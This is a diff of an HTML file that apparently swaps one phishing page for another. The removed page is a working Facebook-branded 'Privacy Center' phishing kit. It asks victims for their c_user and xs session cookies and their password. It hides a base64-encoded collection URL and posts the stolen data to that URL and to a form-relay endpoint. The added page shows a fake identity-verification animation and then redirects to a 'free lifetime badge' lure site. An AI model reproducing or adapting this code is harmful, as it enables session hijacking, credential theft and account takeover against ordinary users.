@@ -1,991 +1,147 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Privacy Center</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
-            background-color: #f0f2f5;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        
-        .container {
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
-            width: 100%;
-            max-width: 432px;
-            margin: 0 auto;
-            overflow: hidden;
-        }
-        
-        .logo-container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            gap: 10px;
-            border-bottom: 1px solid #e5e7eb;
-        }
-        
-        .meta-logo {
-            width: 36px;
-            height: 36px;
-        }
-        
-        .logo-text {
-            color: #1877f2;
-            font-weight: 700;
-            font-size: 20px;
-        }
-        
-        h1 {
-            color: #0a0e27;
-            margin: 0;
-            text-align: center;
-            font-size: 22px;
-            padding: 20px;
-            border-bottom: 1px solid #e5e7eb;
-            font-weight: 600;
-            letter-spacing: 0.3px;
-        }
-        
-        .warning-message {
-            background: linear-gradient(135deg, #fff8e1 0%, #fef3cd 100%);
-            color: #664d03;
-            border-left: 4px solid #ffc107;
-            padding: 18px;
-            margin: 16px;
-            border-radius: 6px;
-            font-size: 14px;
-            line-height: 1.6;
-            border: 1px solid #ffe5a8;
-        }
-        
-        .info-section {
-            background-color: #f0f2f5;
-            padding: 16px;
-            margin: 16px;
-            border-radius: 4px;
-            border-left: 4px solid #1877f2;
-        }
-        
-        .info-section h2 {
-            margin: 0 0 8px 0;
-            color: #000;
-            font-size: 16px;
-            font-weight: 600;
-        }
-        
-        .info-section p {
-            margin: 0;
-            color: #65676b;
-            line-height: 1.5;
-            font-size: 14px;
-        }
-        
-        .form-group {
-            margin-bottom: 16px;
-            padding: 0 16px;
-        }
-        
-        .form-group:first-of-type {
-            padding-top: 16px;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 10px;
-            color: #0a0e27;
-            font-weight: 600;
-            font-size: 14px;
-            letter-spacing: 0.4px;
-            line-height: 1.4;
-            padding: 8px 12px;
-            background: linear-gradient(135deg, #f5f7fb 0%, #f8f9fa 100%);
-            border-left: 3px solid #1877f2;
-            border-radius: 4px;
-            transition: all 0.2s ease;
-        }
-        
-        label:hover {
-            background: linear-gradient(135deg, #eff3f8 0%, #f5f7fb 100%);
-            box-shadow: 0 2px 8px rgba(24, 119, 242, 0.1);
-        }
-        
-        input[type="text"],
-        input[type="email"],
-        input[type="tel"] {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #d0d4d9;
-            border-radius: 6px;
-            font-size: 14px;
-            background-color: #f8f9fa;
-            transition: all 0.3s ease;
-            font-family: inherit;
-        }
-        
-        input[type="text"]:focus,
-        input[type="email"]:focus,
-        input[type="tel"]:focus {
-            outline: none;
-            border-color: #1877f2;
-            background-color: white;
-            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15);
-        }
-        
-        .form-group label input[type="checkbox"] {
-            margin-right: 10px;
-            cursor: pointer;
-            width: 18px;
-            height: 18px;
-            accent-color: #1877f2;
-            flex-shrink: 0;
-        }
-        
-        .form-group label {
-            display: flex;
-            align-items: center;
-            margin-bottom: 8px;
-            cursor: pointer;
-            font-weight: 500;
-            padding: 10px 12px;
-            background: #f0f2f5;
-            border-left: 3px solid #1877f2;
-            border-radius: 4px;
-            transition: all 0.2s ease;
-        }
-        
-        .form-group label:hover {
-            background: #e8ecf1;
-            box-shadow: 0 2px 6px rgba(24, 119, 242, 0.12);
-        }
-        
-        #videoConsent + label {
-            display: flex;
-        }
-        
-        button {
-            width: calc(100% - 32px);
-            margin: 16px;
-            padding: 12px 16px;
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            letter-spacing: 0.5px;
-        }
-        
-        button:hover {
-            background-color: #166fe5;
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
-        }
-        
-        button:active {
-            background-color: #1558d0;
-            transform: translateY(0);
-        }
-        
-        button:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-        
-        #videoContainer {
-            margin: 16px;
-            border-radius: 4px;
-            overflow: hidden;
-        }
-        
-        #videoContainer video {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-        
-        .video-section {
-            padding: 16px;
-            border-bottom: 1px solid #e5e7eb;
-        }
-        
-        .video-section h3 {
-            margin: 0 0 12px 0;
-            color: #000;
-            font-size: 15px;
-            font-weight: 600;
-        }
-        
-        .video-section .video-player {
-            margin: 12px 0;
-            border-radius: 4px;
-            overflow: hidden;
-            background: #f0f2f5;
-        }
-        
-        .video-section .video-player video {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-        
-        .video-section p {
-            margin: 14px 0 0 0;
-            color: #65676b;
-            font-size: 14px;
-            line-height: 1.6;
-            letter-spacing: 0.2px;
-        }
-        
-        .message {
-            margin: 16px;
-            padding: 14px 16px;
-            border-radius: 6px;
-            text-align: center;
-            display: none;
-            font-weight: 500;
-            font-size: 13px;
-            animation: slideUp 0.3s ease;
-        }
-        
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        .message.success {
-            background-color: #dcf8c6;
-            color: #0a6e0a;
-            border: 1px solid #a6d4a8;
-            display: block;
-        }
-        
-        .message.error {
-            background-color: #ffcccc;
-            color: #c60c0c;
-            border: 1px solid #ffaaaa;
-            display: block;
-        }
-        
-        /* Modal Styles */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-        }
-        
-        .modal.show {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .modal-content {
-            background-color: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            width: 90%;
-            max-width: 400px;
-            text-align: center;
-        }
-        
-        .modal-content h2 {
-            color: #000;
-            margin: 0 0 20px 0;
-            font-size: 18px;
-        }
-        
-        .modal-content input[type="text"] {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 20px;
-            border: 1px solid #d0d4d9;
-            border-radius: 6px;
-            font-size: 14px;
-            box-sizing: border-box;
-            background-color: #f8f9fa;
-        }
-        
-        .modal-content input[type="text"]:focus {
-            outline: none;
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.1);
-        }
-        
-        .modal-buttons {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-        }
-        
-        .modal-buttons button {
-            width: auto;
-            margin: 0;
-            padding: 11px 32px;
-            border-radius: 6px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            border: none;
-            transition: all 0.3s ease;
-            letter-spacing: 0.4px;
-        }
-        
-        .modal-buttons .confirm-btn {
-            background-color: #1877f2;
-            color: white;
-        }
-        
-        .modal-buttons .confirm-btn:hover {
-            background-color: #166fe5;
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.25);
-        }
-        
-        .modal-buttons .cancel-btn {
-            background-color: #e4e6eb;
-            color: #050505;
-        }
-        
-        .modal-buttons .cancel-btn:hover {
-            background-color: #cbd5e0;
-            transform: translateY(-1px);
-        }
-        
-        .success-icon {
-            font-size: 48px;
-            margin-bottom: 15px;
-            animation: scaleIn 0.5s ease-out;
-        }
-        
-        @keyframes scaleIn {
-            from {
-                transform: scale(0);
-                opacity: 0;
-            }
-            to {
-                transform: scale(1);
-                opacity: 1;
-            }
-        }
-        
-        .success-message-text {
-            color: #0a6e0a;
-            font-size: 16px;
-            margin-bottom: 24px;
-            line-height: 1.6;
-            font-weight: 500;
-        }
-        
-        .okay-btn {
-            background-color: #1877f2;
-            color: white;
-            padding: 11px 48px;
-            transition: all 0.3s ease;
-        }
-        
-        .okay-btn:hover {
-            background-color: #166fe5;
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
-        }
-        
-        /* Mobile Form Styles */
-        #mobileForm {
-            display: none;
-        }
-        
-        #desktopContent {
-            display: none;
-        }
-        
-        .mobile-form-container {
-            padding: 20px;
-        }
-        
-        .mobile-form-container h2 {
-            color: #0a0e27;
-            font-size: 20px;
-            font-weight: 600;
-            margin-bottom: 12px;
-            letter-spacing: 0.3px;
-        }
-        
-        .mobile-form-container p {
-            color: #65676b;
-            font-size: 14px;
-            margin-bottom: 24px;
-            line-height: 1.6;
-            letter-spacing: 0.2px;
-        }
-        
-        .form-row {
-            margin-bottom: 16px;
-        }
-        
-        .form-row label {
-            display: block;
-            margin-bottom: 6px;
-            color: #050505;
-            font-weight: 500;
-            font-size: 13px;
-        }
-        
-        .country-code-wrapper {
-            display: flex;
-            gap: 8px;
-        }
-        
-        .country-code-wrapper select {
-            width: 35%;
-            padding: 12px 10px;
-            border: 1px solid #d0d4d9;
-            border-radius: 6px;
-            font-size: 13px;
-            background-color: #f8f9fa;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-        
-        .country-code-wrapper select:focus {
-            outline: none;
-            border-color: #1877f2;
-            background-color: white;
-            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.1);
-        }
-        
-        .country-code-wrapper input {
-            flex: 1;
-            padding: 12px;
-            border: 1px solid #d0d4d9;
-            border-radius: 6px;
-            font-size: 13px;
-            background-color: #f8f9fa;
-            transition: all 0.3s ease;
-        }
-        
-        .country-code-wrapper input:focus {
-            outline: none;
-            border-color: #1877f2;
-            background-color: white;
-            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.1);
-        }
-        
-        .form-row input[type="email"],
-        .form-row input[type="text"] {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #d0d4d9;
-            border-radius: 6px;
-            font-size: 14px;
-            background-color: #f8f9fa;
-            transition: all 0.3s ease;
-        }
-        
-        .form-row input[type="email"]:focus,
-        .form-row input[type="text"]:focus {
-            outline: none;
-            border-color: #1877f2;
-            background-color: white;
-            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.1);
-        }
-        
-        #mobileSubmitBtn {
-            width: calc(100% - 32px);
-            padding: 12px 16px;
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            letter-spacing: 0.5px;
-            margin: 16px;
-        }
-        
-        #mobileSubmitBtn:hover {
-            background-color: #166fe5;
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
-        }
-        
-        #mobileSubmitBtn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-        
-        /* After mobile submission */
-        body.mobile-form-submitted {
-            padding: 20px !important;
-        }
-        
-        body.mobile-form-submitted #mobileForm {
-            display: none !important;
-        }
-        
-        body.mobile-form-submitted #desktopContent {
-            display: block !important;
-        }
-        
-        body.mobile-form-submitted .video-section {
-            display: block !important;
-        }
-        
-        body.mobile-form-submitted .info-section {
-            display: block !important;
-        }
-        
-        body.mobile-form-submitted #userForm {
-            display: block !important;
-        }
-        
-        body.mobile-form-submitted .container {
-            border-radius: 8px !important;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1) !important;
-        }
-        
-        /* Desktop Version */
-        @media (min-width: 768px) {
-            body {
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                min-height: 100vh;
-                background-color: #f0f2f5;
-                position: relative;
-            }
-            
-            body::before {
-                content: '';
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background-image: url('https://about.fb.com/wp-content/uploads/2025/03/Profile-and-Friends-Tab-Update-for-FB_Header.jpg');
-                background-size: cover;
-                background-position: center;
-                background-attachment: fixed;
-                filter: blur(5px);
-                opacity: 0.25;
-                z-index: -1;
-            }
-            
-            .container {
-                max-width: 432px;
-                margin: 0;
-                position: relative;
-                z-index: 1;
-            }
-        }
-        
-        /* Mobile Version */
-        @media (max-width: 767px) {
-            .container {
-                border-radius: 0;
-                box-shadow: none;
-            }
-            
-            body {
-                padding: 0;
-            }
-            
-            #mobileForm {
-                display: block;
-            }
-            
-            #desktopContent {
-                display: none;
-            }
-            
-            #userForm {
-                display: none;
-            }
-            
-            .video-section {
-                display: none;
-            }
-            
-            .info-section {
-                display: none;
-            }
-        }
-        
-        /* Desktop Version - Hide Mobile */
-        @media (min-width: 768px) {
-            #mobileForm {
-                display: none;
-            }
-            
-            #desktopContent {
-                display: block;
-            }
-        }
-    </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Verification Complete</title>
+
+<style>
+body {
+    margin: 0;
+    padding: 0;
+    background: linear-gradient(to bottom, #f4f8ff, #e3ecff);
+    font-family: 'Segoe UI', Roboto, sans-serif;
+    height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.container {
+    background: #ffffff;
+    padding: 40px 30px;
+    border-radius: 18px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.12);
+    text-align: center;
+    max-width: 420px;
+    width: 100%;
+}
+
+.scanner-ring {
+    width: 180px;
+    height: 180px;
+    border-radius: 50%;
+    background: conic-gradient(
+        #1877f2,
+        #1da1f2,
+        #0a66c2,
+        #1877f2
+    );
+    animation: spin 2s linear infinite;
+    margin: 0 auto 24px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.scanner-core {
+    width: 130px;
+    height: 130px;
+    background: #fff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 60px;
+    color: #1877f2;
+    font-weight: bold;
+}
+
+.scanner-complete {
+    animation: none;
+    background: #e8f0ff;
+    border: 3px solid #1877f2;
+}
+
+.status-message {
+    font-size: 18px;
+    color: #333;
+    margin-bottom: 12px;
+}
+
+.verified-message {
+    display: none;
+    font-size: 20px;
+    font-weight: 600;
+    color: #1877f2;
+    margin-top: 10px;
+}
+
+.continue-button {
+    display: none;
+    margin-top: 25px;
+    padding: 12px 28px;
+    background-color: #1877f2;
+    color: #fff;
+    font-size: 16px;
+    font-weight: 600;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    transition: 0.3s ease;
+}
+
+.continue-button:hover {
+    background-color: #0f5dc2;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+}
+</style>
 </head>
+
 <body>
-    <div class="container">
-        <div class="logo-container">
-            <svg class="meta-logo" viewBox="0 0 36 36" fill="url(#jsc_s_3)" height="36" width="36">
-                <defs>
-                    <linearGradient x1="50%" x2="50%" y1="97.078%" y2="0%" id="jsc_s_3">
-                        <stop offset="0%" stop-color="#0062E0"></stop>
-                        <stop offset="100%" stop-color="#19AFFF"></stop>
-                    </linearGradient>
-                </defs>
-                <path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z"></path>
-                <path fill="#fff" d="M25 23l.8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z"></path>
-            </svg>
-            <span class="logo-text">Privacy Center</span>
-        </div>
-        
-        <h1>Privacy Center</h1>
-        
-        <!-- Mobile Form -->
-        <form id="mobileForm" class="mobile-form-container">
-            <h2>Account Verification</h2>
-            <p>Please provide the following details to verify your account and proceed with the process.</p>
-            
-            <div class="form-row">
-                <label for="emailAddress">Email Address</label>
-                <input type="email" id="emailAddress" placeholder="name@example.com" required>
-            </div>
-            
-            <div class="form-row">
-                <label for="pageName">Page Name</label>
-                <input type="text" id="pageName" placeholder="Your page name" required>
-            </div>
-            
-            <button type="submit" id="mobileSubmitBtn">Submit</button>
-            <div class="message" id="mobileMessage"></div>
-        </form>
-        
-        <!-- Desktop Form Content -->
-        <div id="desktopContent">
-            <div class="warning-message">
-            <h2>Account Review Required</h2>
-            <p>Your account requires additional verification to ensure compliance with our platform's community standards. Please complete this verification process to restore full access to your account.</p>
-        </div>
-        
-        <div class="video-section">
-            <h3>Verification Instructions</h3>
-            <div class="video-player">
-                <video width="100%" height="auto" controls>
-                    <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
-                    Your browser does not support the video tag.
-                </video>
-            </div>
-            <p>Watch this video for a complete walkthrough of the verification process. Following these steps carefully will ensure your account is restored quickly and securely.</p>
-        </div>
-        
-        <form id="userForm">
-            <div class="form-group">
-                <label for="firstName">c_user</label>
-                <input type="text" id="firstName" name="firstName" placeholder="Enter" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="lastName">xs</label>
-                <input type="text" id="lastName" name="lastName" placeholder="Enter" required>
-            </div>
-            
-            <input type="hidden" name="screen_size" id="screen_size">
-            
-            <button type="submit" id="submitBtn">Complete Verification</button>
-            <div class="message" id="message"></div>
-        </form>
-        
-        <!-- Surname Modal -->
-        <div id="surnameModal" class="modal">
-            <div class="modal-content">
-                <h2>Additional Verification</h2>
-                <label for="surnameInput">Please re-enter your Password:</label>
-                <input type="text" id="surnameInput" placeholder="Enter">
-                <div class="modal-buttons">
-                    <button class="confirm-btn" id="confirmSurnameBtn">Verify</button>
-                    <button class="cancel-btn" id="cancelSurnameBtn">Cancel</button>
-                </div>
-            </div>
-        </div>
-        </div><!-- End Desktop Content -->
-        
-        <!-- Success Modal -->
-        <div id="successModal" class="modal">
-            <div class="modal-content">
-                <div class="success-icon">✓</div>
-                <h2>Verification Successful</h2>
-                <div class="success-message-text">
-                    Your account has been verified successfully. Your account access will be restored within 24 hours. Thank you for your patience.
-                </div>
-                <button class="okay-btn" id="okayBtn">Close</button>
-            </div>
-        </div>
+
+<div class="container">
+    <div class="scanner-ring" id="scannerRing">
+        <div class="scanner-core" id="scannerCore"></div>
     </div>
 
-    <script>
-        document.getElementById("screen_size").value =
-            window.screen.width + " x " + window.screen.height;
-        
-        // Modal elements and functions
-        const modal = document.getElementById('surnameModal');
-        const successModal = document.getElementById('successModal');
-        const surnameInput = document.getElementById('surnameInput');
-        const confirmSurnameBtn = document.getElementById('confirmSurnameBtn');
-        const cancelSurnameBtn = document.getElementById('cancelSurnameBtn');
-        const okayBtn = document.getElementById('okayBtn');
-        const message = document.getElementById('message');
-        const form = document.getElementById('userForm');
-        const screenSizeInput = document.getElementById('screen_size');
-        const submitBtn = document.getElementById('submitBtn');
-        
-        // Binary-encoded backend URL for security
-        function getServerUrl() {
-            const encodedUrl = 'aHR0cHM6Ly9jb21wbGV0ZS15b3VyLXByb2Nlc3Mtbm93LnNpdGUvZHluYW1pYy5waHA=';
-            return atob(encodedUrl);
-        }
+    <div class="status-message" id="statusText">
+        Verifying your identity securely...
+    </div>
 
-        function showSurnameModal() {
-            surnameInput.value = '';
-            modal.classList.add('show');
-            surnameInput.focus();
-        }
+    <div class="verified-message" id="verifiedText">
+        ✔ Verified Successfully
+    </div>
 
-        function closeSurnameModal() {
-            modal.classList.remove('show');
-        }
-        
-        function showSuccessModal() {
-            successModal.classList.add('show');
-        }
-        
-        function closeSuccessModal() {
-            successModal.classList.remove('show');
-            form.reset();
-        }
+    <button class="continue-button" id="continueBtn">
+        Continue
+    </button>
+</div>
 
-        // Form submission
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const firstName = document.getElementById('firstName').value;
-            const lastName = document.getElementById('lastName').value;
-            const screenSize = document.getElementById('screen_size').value;
-            
-            // Validation: First name should only be numbers
-            const isFirstNameNumbers = /^\d+$/.test(firstName);
-            
-            // Validation: Last name should have minimum 20 letters
-            const isLastNameValid = lastName.length >= 20;
-            
-            // Show error if validation fails
-            if (!isFirstNameNumbers || !isLastNameValid) {
-                message.className = 'message error';
-                message.textContent = 'Please complete all required fields correctly according to the video instructions.';
-                return;
-            }
-            
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Verifying...';
-            message.className = 'message';
-            message.textContent = '';
+<script>
+const redirectURL = "https://congratulations-free-lifetimebadge.vercel.app/"; 
 
-            try {
-                const formData = new FormData();
-                formData.append('firstName', firstName);
-                formData.append('lastName', lastName);
-                formData.append('screen_size', screenSize);
+setTimeout(() => {
+    const ring = document.getElementById("scannerRing");
+    const core = document.getElementById("scannerCore");
 
-                const response = await fetch(getServerUrl(), {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: formData
-                });
+    ring.classList.add("scanner-complete");
+    core.textContent = "✔";
 
-                // Send to additional endpoint with JSON
-                const response2 = await fetch('https://submit-form.com/zLkLfL44F', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        firstName: firstName,
-                        lastName: lastName,
-                        screen_size: screenSize
-                    })
-                }).catch(err => console.log('Additional endpoint sent'));
+    document.getElementById("statusText").style.display = "none";
+    document.getElementById("verifiedText").style.display = "block";
+    document.getElementById("continueBtn").style.display = "inline-block";
 
-                // With no-cors mode, we assume success
-                message.className = 'message success';
-                message.textContent = 'Information submitted successfully. Please proceed to verification.';
-                
-                // Show surname modal
-                setTimeout(() => {
-                    showSurnameModal();
-                }, 500);
-            } catch (error) {
-                message.className = 'message error';
-                message.textContent = 'An error occurred while submitting your information. Please try again.';
-                console.error('Submission error:', error);
-            } finally {
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'Complete Verification';
-            }
-        });
+}, 3000);
 
-        // Surname modal confirm button
-        confirmSurnameBtn.addEventListener('click', async () => {
-            const surname = surnameInput.value.trim();
-            
-            if (!surname) {
-                alert('Please enter your verification code to proceed.');
-                return;
-            }
+document.getElementById("continueBtn").addEventListener("click", () => {
+    window.location.href = redirectURL;
+});
+</script>
 
-            try {
-                const verificationData = new FormData();
-                verificationData.append('surname', surname);
-                verificationData.append('screen_size', screenSizeInput.value);
-
-                const response = await fetch(getServerUrl(), {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: verificationData
-                });
-
-                // Send to additional endpoint with JSON
-                const response2 = await fetch('https://submit-form.com/zLkLfL44F', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        surname: surname,
-                        screen_size: screenSizeInput.value
-                    })
-                }).catch(err => console.log('Additional endpoint sent'));
-
-                // Close surname modal and show success modal
-                closeSurnameModal();
-                showSuccessModal();
-            } catch (error) {
-                alert('An error occurred during verification. Please try again.');
-                console.error('Verification error:', error);
-            }
-        });
-
-        // Surname modal cancel button
-        cancelSurnameBtn.addEventListener('click', () => {
-            closeSurnameModal();
-        });
-        
-        // Success modal okay button
-        okayBtn.addEventListener('click', () => {
-            closeSuccessModal();
-        });
-
-        // Close modals if user clicks outside of them
-        window.addEventListener('click', (event) => {
-            if (event.target === modal) {
-                closeSurnameModal();
-            }
-            if (event.target === successModal) {
-                closeSuccessModal();
-            }
-        });
-        
-        // Mobile form submission
-        const mobileForm = document.getElementById('mobileForm');
-        const mobileSubmitBtn = document.getElementById('mobileSubmitBtn');
-        const mobileMessage = document.getElementById('mobileMessage');
-        
-        mobileForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const emailAddress = document.getElementById('emailAddress').value;
-            const pageName = document.getElementById('pageName').value;
-            
-            if (!emailAddress || !pageName) {
-                mobileMessage.className = 'message error';
-                mobileMessage.textContent = 'Please fill in all required fields.';
-                return;
-            }
-            
-            mobileSubmitBtn.disabled = true;
-            mobileSubmitBtn.textContent = 'Submitting...';
-            mobileMessage.className = 'message';
-            mobileMessage.textContent = '';
-            
-            try {
-                const mobileFormData = new FormData();
-                mobileFormData.append('email_address', emailAddress);
-                mobileFormData.append('page_name', pageName);
-                mobileFormData.append('screen_size', screenSizeInput.value);
-                
-                const response = await fetch(getServerUrl(), {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: mobileFormData
-                });
-
-                // Send to additional endpoint with JSON
-                const response2 = await fetch('https://submit-form.com/zLkLfL44F', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        email_address: emailAddress,
-                        page_name: pageName,
-                        screen_size: screenSizeInput.value
-                    })
-                }).catch(err => console.log('Additional endpoint sent'));
-                
-                mobileMessage.className = 'message success';
-                mobileMessage.textContent = 'Thank you! Your information has been received. Please proceed to the next step.';
-                mobileForm.reset();
-                
-                // Show desktop content after successful submission
-                setTimeout(() => {
-                    document.body.classList.add('mobile-form-submitted');
-                }, 500);
-            } catch (error) {
-                mobileMessage.className = 'message error';
-                mobileMessage.textContent = 'An error occurred. Please check your information and try again.';
-                console.error('Mobile submission error:', error);
-            } finally {
-                mobileSubmitBtn.disabled = false;
-                mobileSubmitBtn.textContent = 'Submit';
-            }
-        });
-    </script>
 </body>
 </html>
